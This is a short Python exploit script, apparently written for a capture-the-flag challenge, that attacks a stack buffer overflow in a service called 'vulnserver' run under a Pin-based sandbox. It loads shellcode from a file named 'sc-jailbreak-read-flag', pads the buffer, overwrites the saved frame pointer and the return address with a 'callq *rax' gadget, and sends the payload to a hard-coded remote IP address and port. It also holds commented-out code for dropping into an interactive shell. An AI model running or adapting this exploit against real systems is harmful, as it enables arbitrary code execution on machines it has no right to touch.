#!/usr/bin/env python
import sys
sys.dont_write_bytecode = True

import comm
import struct

evilbuf = ""
evilbuf += open("sc-jailbreak-read-flag", "rb").read()
evilbuf += "P" * (0x110 - len(evilbuf))
evilbuf += struct.pack("<Q", 0x01234567)	# prev rbp
evilbuf += struct.pack("<Q", 0x400f41)      # retaddr -> "callq *rax"
evilbuf += "E" * (512 - len(evilbuf))

"""
sock = comm.connect_to_subprocess(
    #["/opt/pin-2.14-71313-gcc.4.4.7-linux/intel64/bin/pinbin",
    ["/opt/pinhole-root/bin/pinbin",
    "-t", "/opt/pinhole-root/bin/Pinhole.so", 
    "--", "/opt/pinhole-root/bin/vulnserver"])

"""
sock = comm.connect_to_tcpserver(("133.242.224.9", 10000))

sock.sendall(evilbuf)
#print "Got shell"
#comm.interact(sock)
comm.recv_lines(sock)

